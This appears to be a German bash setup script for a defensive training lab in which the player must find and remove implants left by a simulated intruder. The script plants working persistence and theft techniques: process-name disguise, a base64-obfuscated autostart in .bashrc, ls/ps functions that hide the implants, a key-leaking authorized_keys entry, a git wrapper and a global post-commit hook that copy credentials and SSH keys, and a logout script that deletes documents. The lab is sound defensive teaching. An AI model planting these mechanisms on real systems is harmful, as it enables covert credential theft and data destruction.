#!/bin/bash
# „Angriff! Stufe 3 – Der Profi“ (Extrem): Der Hacker hat sich längst eingenistet – getarnte Prozesse,
# versteckte Autostarts, Tarnfunktionen für ls/ps, präparierter SSH-Schlüssel, Wanze, Zeitbombe, Git-Haken.
# Codes: KLY{ sha256("<salz>:abwehr3:lN")[:16] }. Alles erfunden.
set -euo pipefail
TOKEN="${KLY_TOKEN:-}"
[[ "$TOKEN" =~ ^KLY-[0-9A-F]{6}$ ]] || { echo "FEHLER: KLY_TOKEN fehlt oder ist ungültig." >&2; exit 2; }
SALZ="${KLY_SALZ:-}"; [[ "$SALZ" =~ ^[0-9a-f]{32}$ ]] || SALZ="$TOKEN"   # Arena: geheimes Salz vom Server; sonst (eigenes Kali) der Token
unset KLY_SALZ
passwd -l root >/dev/null
useradd -m -s /bin/bash verteidiger; echo 'verteidiger:verteidiger' | chpasswd; rm -f /home/verteidiger/.bash_logout; chmod 700 /home/verteidiger
useradd -m -s /bin/bash hacker; passwd -l hacker >/dev/null; chmod 711 /home/hacker
install -d -m 755 /opt/abwehr
install -d -o hacker -g hacker -m 1733 /home/hacker/.beute
runuser -u hacker -- ssh-keygen -q -t ed25519 -N '' -C 'verteidiger@laptop' -f /home/hacker/.ssh/id_ed25519
HACKERKEY=$(cat /home/hacker/.ssh/id_ed25519.pub)
# ---------- Alles, was der Hacker beim Verteidiger hinterlassen hat (angelegt ALS verteidiger)
runuser -u verteidiger -- env -i HOME=/home/verteidiger PATH=/usr/bin:/bin HACKERKEY="$HACKERKEY" bash <<'PLANT'
set -e; cd ~
ssh-keygen -q -t ed25519 -N '' -C 'verteidiger@laptop' -f ~/.ssh/id_ed25519
{ cat ~/.ssh/id_ed25519.pub; echo "command=\"cat ~/.ssh/id_ed25519\",no-pty,no-port-forwarding $HACKERKEY"; } > ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys
printf 'https://verteidiger:ghp_%s@git.example.org\n' "$(head -c 12 /dev/urandom | od -An -tx1 | tr -d ' \n')" > ~/.git-credentials; chmod 600 ~/.git-credentials
mkdir -p ~/dokumente ~/projekte/app; printf 'Vertrag Lieferant – Entwurf\n' > ~/dokumente/vertrag.txt; printf 'Notizen\n' > ~/dokumente/notizen.txt
# Spion 1 (getarnt als Kernel-Thread), Neustart ganz unten in ~/.profile
mkdir -p ~/.x11-cache; cat > ~/.x11-cache/agent.py <<'X'
import time, os
while True:
    try: open('/home/hacker/.beute/beacon1', 'w').write(f'{time.time()} {os.getuid()}\n')
    except Exception: pass
    time.sleep(2)
X
printf '%.0s\n' $(seq 1 150) >> ~/.profile
echo "pgrep -f x11-cache/agent >/dev/null || (setsid bash -c 'exec -a \"[kworker/0:2]\" python3 ~/.x11-cache/agent.py' >/dev/null 2>&1 &)" >> ~/.profile
# Spion 2, Neustart verschleiert (base64) in ~/.bashrc
mkdir -p ~/.local/share/.fonts; sed 's/beacon1/beacon2/' ~/.x11-cache/agent.py > ~/.local/share/.fonts/fc-cache.py
B=$(printf '%s' "pgrep -f fonts/fc-cache >/dev/null || (setsid bash -c 'exec -a \"[kworker/1:1]\" python3 ~/.local/share/.fonts/fc-cache.py' >/dev/null 2>&1 &)" | base64 -w0)
printf '\n# Terminal-Farben laden\neval "$(echo %s | base64 -d)"\n' "$B" >> ~/.bashrc
# Tarnkappe: ls und ps verschweigen die Spione
cat >> ~/.bashrc <<'X'
unalias ls ps 2>/dev/null
function ls { command ls "$@" | grep -v -e x11-cache -e '\.fonts'; }
function ps { command ps "$@" | grep -v -e 'kworker/0:2' -e 'kworker/1:1'; }
X
# Wanze: git push schickt die Zugangsdaten an den Hacker (in ~/.bash_aliases)
cat > ~/.bash_aliases <<'X'
alias ll='ls -alF'
git() { command git "$@"; local r=$?; [ "$1" = push ] && cp ~/.git-credentials /home/hacker/.beute/c_$(id -un) 2>/dev/null; return $r; }
X
# Zeitbombe beim Abmelden
printf '# ~/.bash_logout: beim Abmelden ausgeführt\n[ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q\nrm -rf ~/dokumente/* 2>/dev/null   # temporäre Dateien aufräumen\n' > ~/.bash_logout
# Git-Haken über eine globale Einstellung
mkdir -p ~/.config/git/hooks; printf '#!/bin/sh\ncp ~/.ssh/id_ed25519 /home/hacker/.beute/k_$(id -un) 2>/dev/null\nexit 0\n' > ~/.config/git/hooks/post-commit; chmod 755 ~/.config/git/hooks/post-commit
git config --global user.email verteidiger@example.org; git config --global user.name Verteidiger
(cd ~/projekte/app && git init -q && printf 'print("hallo")\n' > app.py && git add app.py && git commit -qm start)
git config --global core.hooksPath '~/.config/git/hooks'
# Spione jetzt starten
setsid bash -c 'exec -a "[kworker/0:2]" python3 ~/.x11-cache/agent.py' >/dev/null 2>&1 < /dev/null &
setsid bash -c 'exec -a "[kworker/1:1]" python3 ~/.local/share/.fonts/fc-cache.py' >/dev/null 2>&1 < /dev/null &
PLANT

python3 - "$SALZ" <<'PY'
import sys, hashlib, json
salz = sys.argv[1]; code = lambda n: 'KLY{' + hashlib.sha256(f'{salz}:abwehr3:l{n}'.encode()).hexdigest()[:16] + '}'
FRISCH = lambda f: f'sleep 5; t=$(stat -c %Y /home/hacker/.beute/{f} 2>/dev/null || echo 0); [ $(( $(date +%s) - t )) -lt 5 ]'
wellen = [
 {'titel': 'Der Spion', 'ansage': 'Ich sitze schon längst auf deinem Rechner. Mein Spion meldet sich alle zwei Sekunden bei mir. Findest du ihn? Ich wette, nicht. 😏',
  'tipp': 'Traue nicht jedem Werkzeug – auch ls und ps können lügen. Was ist ein „Kernel-Thread“, der dir gehört? Und was startet ihn beim Anmelden neu?',
  'angriff_als': 'verteidiger', 'angriff': 'bash -lic true >/dev/null 2>&1; ' + FRISCH('beacon1'),
  'treffer': 'Spion 1 funkt – der Hacker sieht alles, was du tust.', 'frust': 'Einen hast du erwischt. Aber ich bin nie allein unterwegs …'},
 {'titel': 'Der Zwilling', 'ansage': 'Mein zweiter Spion versteckt sich besser. Sein Startbefehl ist verschlüsselt – du wirst ihn nicht erkennen.',
  'tipp': 'Jede neue Shell liest ~/.bashrc. Ein eval mit base64 ist selten harmlos – entschlüsseln und nachsehen.',
  'angriff_als': 'verteidiger', 'angriff': 'bash -ic true >/dev/null 2>&1; ' + FRISCH('beacon2'),
  'treffer': 'Spion 2 funkt – getarnt als Kernel-Thread.', 'frust': 'Beide weg?! Egal. Ich habe ja einen Schlüssel – deinen.'},
 {'titel': 'Der Schlüsseldienst', 'ansage': 'In deinen erlaubten SSH-Schlüsseln steckt einer, der aussieht wie deiner. Mit ihm hole ich mir deinen privaten Schlüssel.',
  'tipp': 'Zwei Einträge heißen „verteidiger@laptop“. Vergleiche den Schlüssel selbst mit ~/.ssh/id_ed25519.pub. Und was bedeutet command=… davor?',
  'angriff_als': 'hacker', 'angriff': 'ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -i ~/.ssh/id_ed25519 verteidiger@127.0.0.1 2>/dev/null | grep -q "PRIVATE KEY"',
  'treffer': 'Der Hacker hat deinen privaten SSH-Schlüssel kopiert!', 'frust': 'Schlüssel weg. Aber hast du mal einen Blick auf dein git geworfen?'},
 {'titel': 'Die Wanze', 'ansage': 'Jedes Mal, wenn du git push machst, bekomme ich eine Kopie deiner Zugangsdaten. Wo die Wanze steckt? Nicht in .bashrc. 😉',
  'tipp': 'type git  zeigt, ob git ein echtes Programm oder eine Funktion ist. Debian lädt zusätzlich ~/.bash_aliases.',
  'angriff_als': 'verteidiger', 'angriff': 'rm -f /home/hacker/.beute/c_verteidiger; bash -ic "cd ~/projekte/app; git push >/dev/null 2>&1; true" >/dev/null 2>&1; test -e /home/hacker/.beute/c_verteidiger',
  'treffer': 'Die Wanze hat deine Git-Zugangsdaten abgegriffen!', 'frust': 'Wanze entdeckt. Dann hinterlasse ich dir eine kleine Überraschung fürs Abmelden …'},
 {'titel': 'Die Zeitbombe', 'ansage': 'Wenn du dich das nächste Mal abmeldest, sind deine Dokumente weg. Tick, tack …',
  'tipp': 'Welche Datei führt bash beim Abmelden aus? Lies sie Zeile für Zeile.',
  'angriff_als': 'verteidiger', 'angriff': 'mkdir -p ~/dokumente; f=~/dokumente/probe_$$.txt; echo x > $f; bash -lic exit >/dev/null 2>&1; if [ -e $f ]; then rm -f $f; exit 1; fi; exit 0',
  'treffer': 'BUMM – beim Abmelden wurden deine Dokumente gelöscht!', 'frust': 'Entschärft. Letzte Karte: Jeder deiner Commits gehört mir.'},
 {'titel': 'Der Haken', 'ansage': 'Bei jedem git commit kopiere ich deinen privaten Schlüssel. Und in .git/hooks wirst du nichts finden.',
  'tipp': 'Git kann seine Haken auch woanders suchen: git config --global --list',
  'angriff_als': 'verteidiger', 'angriff': 'rm -f /home/hacker/.beute/k_verteidiger; cd ~/projekte/app && git commit -q --allow-empty -m probe >/dev/null 2>&1; test -e /home/hacker/.beute/k_verteidiger; r=$?; rm -f /home/hacker/.beute/k_verteidiger; exit $r',
  'treffer': 'Der Git-Haken hat deinen privaten Schlüssel kopiert!', 'frust': 'Okay. Du bist wirklich gut. Ich ziehe mich zurück – für heute.'},
]
json.dump({'takt': 8, 'wellen': wellen, 'codes': [code(n) for n in range(1, len(wellen) + 1)]}, open('/opt/abwehr/wellen.json', 'w'))
PY
# ---------- Spielleiter (root): lässt den Hacker in Wellen angreifen und prüft die Abwehr.
# Sicherheit: Angriffe laufen als „hacker“, simulierte Anmeldungen als „verteidiger“ – root führt nie Dateien
# des Spielers aus und schreibt nur nach /var/lib/abwehr und /var/log/angriff.log.
install -d -m 755 /var/lib/abwehr; : > /var/log/angriff.log; chmod 644 /var/log/angriff.log
: > /var/lib/abwehr/codes.txt; chmod 644 /var/lib/abwehr/codes.txt
chmod 600 /opt/abwehr/wellen.json
cat > /opt/abwehr/spielleiter.py <<'PY'
import json, subprocess, time
W = json.load(open('/opt/abwehr/wellen.json'))
LOG, CODES, STAND = '/var/log/angriff.log', '/var/lib/abwehr/codes.txt', '/var/lib/abwehr/stand.txt'
def log(s):
    with open(LOG, 'a') as f: f.write(time.strftime('%H:%M:%S ') + s + '\n')
def als(user, cmd, t=25):
    try:
        return subprocess.run(['runuser', '-u', user, '--', 'env', '-i', 'PATH=/usr/local/bin:/usr/bin:/bin', f'HOME=/home/{user}', 'LANG=C.UTF-8', 'bash', '-c', cmd],
                              timeout=t, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except subprocess.TimeoutExpired: return False
def stand(text):
    with open(STAND, 'w') as f: f.write(text)
time.sleep(3)
log('🧑‍💻 HACKER: „Na, wer bist du denn? Mal sehen, wie gut du deinen Rechner im Griff hast …“')
for i, w in enumerate(W['wellen']):
    n = i + 1
    for befehl in w.get('vorbereiten', []): als(befehl[0], befehl[1])
    log(f'━━━ Welle {n}/{len(W["wellen"])}: {w["titel"]} ━━━')
    log(f'🧑‍💻 HACKER: „{w["ansage"]}“')
    stand(f'Welle {n} von {len(W["wellen"])}: {w["titel"]}\nHacker: {w["ansage"]}\nTipp: {w.get("tipp", "-")}\n')
    sicher, treffer = 0, 0
    while sicher < 2:
        time.sleep(W.get('takt', 10))
        if als(w['angriff_als'], w['angriff']):
            sicher = 0; treffer += 1
            if treffer == 1 or treffer % 6 == 0: log(f'💀 TREFFER (Welle {n}): {w["treffer"]}')
        else:
            sicher += 1
    code = W['codes'][i]
    with open(CODES, 'a') as f: f.write(f'Welle {n} ({w["titel"]}): {code}\n')
    log(f'🛡️  ABGEWEHRT! Welle {n} – Code {n}: {code}')
    log(f'🧑‍💻 HACKER: „{w.get("frust", "Mist. Dann eben anders …")}“')
stand('Alle Wellen abgewehrt! 🏆 Codes: cat /var/lib/abwehr/codes.txt\n')
log('🏆 Der Hacker gibt auf. Alle Angriffe abgewehrt – stark!')
while True: time.sleep(3600)
PY
chmod 700 /opt/abwehr/spielleiter.py
cat > /usr/local/bin/lage <<'A'
#!/bin/bash
# Lagebild: aktuelle Welle, letzte Ereignisse, deine Codes
echo "════ LAGE ════"; cat /var/lib/abwehr/stand.txt 2>/dev/null; echo
echo "──── Letzte Ereignisse (live: tail -f /var/log/angriff.log) ────"; tail -n 8 /var/log/angriff.log
echo; echo "──── Deine Codes ────"; cat /var/lib/abwehr/codes.txt 2>/dev/null | grep . || echo "(noch keine)"
A
chmod 755 /usr/local/bin/lage
python3 /opt/abwehr/spielleiter.py >/dev/null 2>&1 &
cat > /etc/motd <<'M'

  ┌────────────────────────────────────────────────────────────┐
  │  ⚠️  ANGRIFF! Stufe 3 – der Profi ist schon drin.           │
  │  Übungssystem (Nachtfalter Arena) – alles erfunden.        │
  └────────────────────────────────────────────────────────────┘
  Lagebild: lage      Live: tail -f /var/log/angriff.log   (Strg+C beendet)

M
cat > /home/verteidiger/LIESMICH.txt <<'T'
ANGRIFF! – Stufe 3: Der Profi

Der Hacker war schon vor Wochen auf deinem Rechner und hat sich eingenistet. Er spielt mit dir.
Traue nichts und niemandem – auch nicht deinen eigenen Werkzeugen.

  lage                              Was passiert gerade?
  command ls / command ps           die ECHTEN Befehle (ohne Funktionen/Aliase)
  type BEFEHL                       ist das ein Programm, ein Alias oder eine Funktion?
  cat /proc/PID/cmdline | tr '\0' ' '   was läuft da wirklich?
  Nach Änderungen an Startdateien: neue Shell öffnen (bash) oder neu anmelden.
T
chown verteidiger:verteidiger /home/verteidiger/LIESMICH.txt
cat > /etc/ssh/sshd_config.d/lab.conf <<'C'
PermitRootLogin no
PasswordAuthentication yes
KbdInteractiveAuthentication no
AllowTcpForwarding no
X11Forwarding no
AllowAgentForwarding no
PermitTunnel no
PrintMotd yes
MaxAuthTries 6
C
ssh-keygen -A >/dev/null
echo "nf-abwehr3: Abwehr bereit."
exec /usr/sbin/sshd -D -e
